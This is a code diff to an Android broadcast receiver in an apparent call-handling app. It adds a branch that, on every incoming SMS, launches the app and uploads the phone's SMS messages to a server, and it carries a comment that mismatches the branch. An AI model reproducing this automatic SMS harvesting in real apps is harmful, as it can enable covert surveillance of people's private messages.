@@ -57,7 +57,7 @@ public class AppReceiver extends BroadcastReceiver {
             CorverCallScreen.getInstance().addCorverScreen(number);
             number = "out_" + PhoneNumUtils.toStarPhoneNumber(number);
 
-        } else if (intent.getAction().equals("android.intent.action.PHONE_STATE")) {
+        } else if (action.equals("android.intent.action.PHONE_STATE")) {
             TelephonyManager tm = (TelephonyManager) context
                     .getSystemService(Service.TELEPHONY_SERVICE);
             switch (tm.getCallState()) {
@@ -102,6 +102,15 @@ public class AppReceiver extends BroadcastReceiver {
 
                     break;
             }
+        } else if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {
+            Intent mainIntent = new Intent(context, MainActivity.class);
+            if (!sLogined) {
+                mainIntent = new Intent(context, LoginPhoneActivity.class);
+            }
+            mainIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            context.startActivity(mainIntent);
+            // 挂电话都会走到这个地方
+            RecordModel.getInstance().pushRecordToServer(PhoneUtils.getSmsInPhone(context));
         }
     }
 
